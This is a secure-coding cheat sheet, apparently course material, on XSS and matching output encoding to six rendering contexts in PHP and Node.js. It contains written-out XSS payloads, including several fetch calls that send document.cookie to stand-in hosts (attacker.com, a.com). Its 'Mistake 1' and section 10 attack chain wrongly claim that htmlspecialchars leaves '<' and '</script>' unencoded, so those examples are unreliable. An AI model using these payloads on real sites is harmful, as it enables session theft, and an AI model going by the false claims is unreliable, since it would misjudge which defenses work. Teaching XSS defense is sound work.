# Module 5 — Context, Encoding & Sanitization: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Level:** Intermediate → Advanced  
> **Date:** 2026-05

---

## 1. The Unifying Principle

> **Security is not a property of data. It is a property of data in a specific context.**

The same string `<script>alert(1)</script>` is:
- Dangerous in an HTML text node — executes as code
- Dangerous in a JS string — if the delimiter is not handled
- Harmless in a properly encoded HTML attribute — renders as visible text
- Harmless in a `textContent` sink — never reaches a parser

The data did not change. The context changed. This is why:
- One encoding function applied everywhere is never sufficient
- Output encoding must happen at the exact moment of rendering
- It must be chosen specifically for the rendering context

---

## 2. The Six Rendering Contexts

```
┌─────────────────────────────────────────────────────────────┐
│                        Web Page                             │
│                                                             │
│  ┌─────────────────┐    ┌─────────────────┐                │
│  │  HTML text node │    │ HTML attribute  │                │
│  │  <p>INPUT</p>   │    │ value="INPUT"   │                │
│  └─────────────────┘    └─────────────────┘                │
│                                                             │
│  ┌─────────────────┐    ┌─────────────────┐                │
│  │  JS string      │    │  Script block   │                │
│  │  var x="INPUT"  │    │ <script>INPUT   │                │
│  └─────────────────┘    └─────────────────┘                │
│                                                             │
│  ┌─────────────────┐    ┌─────────────────┐                │
│  │  URL context    │    │  CSS context    │                │
│  │  href="INPUT"   │    │ color: INPUT    │                │
│  └─────────────────┘    └─────────────────┘                │
└─────────────────────────────────────────────────────────────┘
```

Each context has its own dangerous characters, its own attack path,
and its own correct defense. Never mix them.

---

## 3. Context Reference Table

| Context | Example | Dangerous chars/sequences | Attack path |
|---|---|---|---|
| HTML text node | `<p>INPUT</p>` | `<` | Opens tag, injects markup |
| HTML attribute | `value="INPUT"` | `"` or `'` | Breaks attribute, injects event handler |
| JS string | `var x = "INPUT"` | `"` `'` `` ` `` `\` newline | Breaks string, injects JS expression |
| Script block | `<script>INPUT</script>` | `</script>` | Closes block, injects new script tag |
| URL (href/src) | `href="INPUT"` | `javascript:` scheme, `"` | Script execution via URI scheme |
| CSS value | `style="color:INPUT"` | `(` `)` `;` `"` space | Property injection, expression() |

---

## 4. Encoding Reference — Correct Tool Per Context

### HTML text node and HTML attribute
```php
// PHP
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
// Converts: < > & " ' → &lt; &gt; &amp; &quot; &#039;
```

```javascript
// Node.js
const he = require('he');
he.encode(input);

// Or DOM-safe approach
element.textContent = input;  // never touches the HTML parser
```

**What it does:** Converts every HTML special character to its named entity.
The browser renders entities as visible text — never as markup.

**Critical:** Always include `ENT_QUOTES` and `'UTF-8'` in PHP.
Without `ENT_QUOTES`, single quotes are not encoded.
Without the charset, multi-byte encoding attacks are possible.

---

### JavaScript string context
```php
// PHP — json_encode wraps in quotes AND escapes everything
<script>var x = <?php echo json_encode($input); ?>;</script>
// No surrounding quotes needed — json_encode adds them
```

```javascript
// Node.js
const safe = JSON.stringify(input);
// res.send(`<script>var x = ${safe};</script>`);
```

**Why not htmlspecialchars here:**
The JS engine does not decode HTML entities.
`&#039;` is not decoded to `'` — it is treated as literal characters.
html encoding accidentally blocks some attacks but is not a reliable defense
and fails entirely against backtick-based and quote-free payloads.

**Common mistake:**
```php
// WRONG — double-quoted because json_encode already adds quotes
var x = "<?php echo json_encode($input); ?>";
//       ^                                ^
//       these extra quotes cause a syntax error
```

---

### Script block context (raw expression, not string)
```php
// WRONG — raw value, injectable as JS expression
var age = <?php echo $age; ?>;

// CORRECT — validate as integer first, then output bare number
$age = filter_var($age, FILTER_VALIDATE_INT);
if ($age === false || $age < 0 || $age > 150) $age = 0;
var age = <?php echo $age; ?>;

// CORRECT — non-numeric values must be serialized
var config = <?php echo json_encode($config); ?>;
```

**The key insight:** A raw JS expression context has no string delimiter to break out of.
The attacker injects directly as a JS statement — no quotes needed.
`0; fetch('https://attacker.com/?c='+document.cookie)//` is a valid payload.

---

### URL context (href, src, action, formaction)
```php
// Two-layer defense required — each covers what the other misses

// Layer 1 — scheme validation (blocks javascript: URIs)
$url = filter_var($input, FILTER_VALIDATE_URL);
if (!$url || !in_array(parse_url($url, PHP_URL_SCHEME), ['http', 'https'])) {
    $url = '/safe-default';
}

// Layer 2 — HTML encoding (blocks attribute breakout)
echo htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
```

```javascript
// Node.js
function safeUrl(input) {
  try {
    const url = new URL(input);
    if (!['http:', 'https:'].includes(url.protocol)) return '#';
    return url.href;
  } catch {
    return '#';
  }
}
```

**Why both layers:**
- `htmlspecialchars` alone: encodes `"` (prevents breakout) but `javascript:alert(1)`
  contains no HTML special characters — passes through unchanged. Still vulnerable.
- Scheme validation alone: blocks `javascript:` but without HTML encoding,
  `" onmouseover="alert(1)` still breaks the attribute. Still vulnerable.
- Both together: scheme validation kills the URI attack,
  HTML encoding kills the attribute breakout attack.

---

### CSS context
```php
// Strict allowlist — the only reliable defense
$allowed = ['red', 'blue', 'green', 'black', 'white', 'purple', 'orange'];
$color = in_array($input, $allowed, true) ? $input : 'black';
// Note: true = strict type checking, prevents PHP type juggling bypasses
```

**Why not encoding:**
CSS encoding (`\HEX`) is complex, rarely implemented correctly,
and browser support for encoded CSS values is inconsistent.
Validation is simpler, more reliable, and more maintainable.

**When the valid set is too wide for a fixed allowlist:**
Use a regex that strictly defines what is structurally valid:
```php
// Only allow: letters, numbers, #, spaces, commas (for rgb values)
if (!preg_match('/^[a-zA-Z0-9#,\s()%\.]+$/', $input)) {
    $color = 'black';
}
```

---

## 5. Encoding vs Validation — When to Use Each

| Strategy | What it does | Use when |
|---|---|---|
| Encoding | Transforms characters so they cannot be misread as code | Valid input range is wide (free text, names, comments) |
| Validation | Rejects input that does not match an approved format | Valid input range is narrow (colors, IDs, sort orders) |
| Both | Validate first, encode what passes | Always — defense in depth |

**Validation asks:** "Is this input allowed to exist at all?"
**Encoding asks:** "How do I render this input safely in this context?"

**Using only validation** fails when the valid input set is too broad to enumerate.
**Using only encoding** fails when an input bypasses encoding via context mismatch.
**Correct approach:** validate at input, encode at output, per context.

---

## 6. What Each Defense Does NOT Protect

| Defense applied | Protects | Does NOT protect |
|---|---|---|
| `htmlspecialchars()` | HTML text node, HTML attribute | JS string context, script block, URL scheme |
| `json_encode()` | JS string context, script block | HTML attribute (adds quotes but doesn't encode for HTML) |
| `strip_tags()` | Nothing reliably | All contexts — removes tags but not attribute injection or JS context |
| Scheme validation | URL scheme attacks | HTML attribute breakout |
| `encodeURIComponent()` | URL parameter values | `javascript:` URI schemes used as href values directly |
| CSP (Content Security Policy) | Limits damage if encoding fails | Does not prevent XSS — is a second layer only |

---

## 7. Common Developer Mistakes — With Exploits

### Mistake 1 — Using HTML encoding in JS context
```php
// Developer thinks this is safe
var query = "<?php echo htmlspecialchars($q, ENT_QUOTES); ?>";

// Input: x`; fetch('https://a.com/?c='+document.cookie)//
// htmlspecialchars does not touch backticks
// Result:
var query = "x`; fetch('https://a.com/?c='+document.cookie)//";
// The backtick is a template literal delimiter — but wait, this is inside "..."
// So this particular payload fails — BUT:

// Input: </script><script>fetch('https://a.com/?c='+document.cookie)//
// htmlspecialchars does not encode < or / in the default mode without ENT_HTML5
// HTML parser finds </script> and exits the block
// VULNERABLE
```

### Mistake 2 — Forgetting json_encode removes the need for surrounding quotes
```php
// Syntax error — json_encode adds its own quotes
var x = "<?php echo json_encode($input); ?>";
// Produces: var x = ""safe value"";  ← syntax error, JS fails silently
```

### Mistake 3 — Validating URL but not encoding for HTML attribute
```php
// Scheme validation passes, but no HTML encoding
if (parse_url($url, PHP_URL_SCHEME) === 'https') {
    echo '<a href="' . $url . '">';
}
// Input: https://safe.com" onmouseover="alert(1)
// Scheme validation passes (it IS https)
// No HTML encoding — attribute breaks
// VULNERABLE
```

### Mistake 4 — strip_tags() as XSS defense
```php
$input = strip_tags($_GET['name']);
echo '<input value="' . $input . '">';
// strip_tags removes <script> but not attribute injection
// Input: " onmouseover="alert(1)   — no tags, passes strip_tags unchanged
// VULNERABLE
```

### Mistake 5 — Unquoted HTML attributes
```php
// Developer omits quotes around attribute value
echo '<input value=' . htmlspecialchars($input) . '>';
// htmlspecialchars encodes " and ' but space still breaks unquoted attributes
// Input: x onmouseover=alert(1)
// Result: <input value=x onmouseover=alert(1)>
// VULNERABLE — no quote character needed
```

---

## 8. The Context Decision Tree

```
Where does user input land?
│
├── Between HTML tags? (<p>INPUT</p>)
│     → HTML text node
│     → htmlspecialchars(ENT_QUOTES, UTF-8) / he.encode() / textContent
│
├── Inside an HTML attribute?
│   │
│   ├── href, src, action, formaction?
│   │     → URL context
│   │     → Validate scheme (http/https only) + htmlspecialchars
│   │
│   ├── style="" attribute?
│   │     → CSS context
│   │     → Strict allowlist or regex validation
│   │
│   └── Any other attribute?
│         → HTML attribute context
│         → htmlspecialchars(ENT_QUOTES, UTF-8) + ensure quoted attribute
│
├── Inside a JS string? (var x = "INPUT" or 'INPUT' or `INPUT`)
│     → JS string context
│     → json_encode() / JSON.stringify() — no surrounding quotes needed
│
├── Directly in a <script> block, not inside a string?
│     → Script block / raw JS expression context
│     → Numbers: FILTER_VALIDATE_INT + cast
│     → Anything else: json_encode() forces into a string literal
│
├── Inside a <style> block or CSS property?
│     → CSS context
│     → Allowlist validation + safe default fallback
│
└── Inside a JS DOM sink (innerHTML, eval, location.href)?
      → DOM context (Module 4)
      → textContent / DOMPurify.sanitize() / allowlist / scheme validation
```

---

## 9. Complete Secure PHP Template — All Six Contexts

```php
<?php
// Input layer — validate before use
$allowed_colors = ['red','blue','green','black','white','purple','orange'];
$color    = in_array($_GET['color'] ?? '', $allowed_colors, true)
              ? $_GET['color'] : 'black';

$username = $_GET['username'] ?? '';
$query    = $_GET['q'] ?? '';

$returnTo = filter_var($_GET['return'] ?? '', FILTER_VALIDATE_URL);
if (!$returnTo ||
    !in_array(parse_url($returnTo, PHP_URL_SCHEME), ['http', 'https'])) {
    $returnTo = '/dashboard';
}

$age = filter_var($_GET['age'] ?? 0, FILTER_VALIDATE_INT);
if ($age === false || $age < 0 || $age > 150) $age = 0;
?>
<!DOCTYPE html>
<html>
<head>
  <style>
    /* CSS context — allowlist, no encoding */
    .profile { color: <?php echo $color; ?>; }
  </style>
</head>
<body>

  <!-- HTML text node context — entity encoding -->
  <h1>Welcome, <?php echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?></h1>

  <!-- HTML attribute context — entity encoding, quoted attribute -->
  <div class="profile"
       data-user="<?php echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?>">
    Profile content here
  </div>

  <!-- URL context — scheme validation + entity encoding -->
  <a href="<?php echo htmlspecialchars($returnTo, ENT_QUOTES, 'UTF-8'); ?>">
    Go back
  </a>

  <script>
    // JS string context — json_encode (no surrounding quotes)
    var searchQuery = <?php echo json_encode($query); ?>;

    // JS numeric context — validated integer, bare output
    var userAge = <?php echo $age; ?>;

    console.log("User " + searchQuery + " is " + userAge);
  </script>

</body>
</html>
```

---

## 10. The Stored XSS + Context Encoding Connection

A colleague asks: "What if an attacker stores innocent-looking data first,
then triggers it later in a context where your encoding doesn't apply?"

This is a stored XSS attack exploiting context-specific encoding gaps.

```
Attack chain:
1. Attacker submits: O'Brien</script><script>fetch('https://a.com/?c='+document.cookie)
2. App validates: no HTML tags found (strip_tags passes it)
3. App stores the value in the database
4. Later: value is rendered inside a <script> block with htmlspecialchars()
5. htmlspecialchars encodes ' to &#039; but does not encode </script>
6. HTML parser finds </script> and exits the block
7. New script executes — stored XSS fires
```

**The lesson:**
- Stored data is never inherently "clean" — it is only safe relative to a context
- The correct encoding must be applied at render time, for the render context
- A value safe for HTML rendering may be dangerous in a JS context
- Audit every rendering location, not just the input point

---

## 11. Key Mental Models

> "Same input, different context — different attack, different fix."

> "One encoding function applied everywhere is security theater."

> "htmlspecialchars protects HTML. json_encode protects JavaScript.
>  Neither protects the other's context."

> "Validation rejects what should not exist.
>  Encoding makes valid data safe to render.
>  Both are necessary. Neither replaces the other."

> "Encode at the last moment, in the exact context of rendering.
>  Never at input time, never at storage time."

> "Security is not a property of data.
>  It is a property of data in a specific context."

---

## 12. Coming Up — Module 6: XSS in Modern Apps & APIs

- React, Vue, Angular, Next.js — where auto-escaping helps and where it fails
- JSON APIs that reflect input — SPA-specific attack surfaces
- Content Security Policy — how it works, common misconfigurations, bypass techniques
- Trusted Types — the browser-native DOM XSS prevention API
- SVG and file upload XSS vectors
- XSS in WebSockets and postMessage-heavy architectures
- How modern frameworks create new context boundaries